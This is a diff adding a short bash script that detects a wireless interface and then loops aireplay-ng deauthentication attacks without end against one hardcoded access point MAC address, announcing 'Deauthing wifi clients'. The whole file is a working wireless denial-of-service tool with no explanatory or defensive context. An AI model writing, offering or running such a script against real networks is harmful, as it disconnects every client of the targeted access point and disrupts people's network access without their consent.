@@ -1,0 +1,9 @@
+#!/bin/bash
+iface=$(sudo iw dev | awk '$1=="Interface"{print $2}')
+if [[ $iface == "" ]]; then
+	iface=$(zenity --entry --text="Provide interface")
+fi
+notify-send "Deauthing wifi clients"
+while true; do
+	sudo aireplay-ng -0 00 -a F4:CB:52:F5:12:B5 $iface
+done
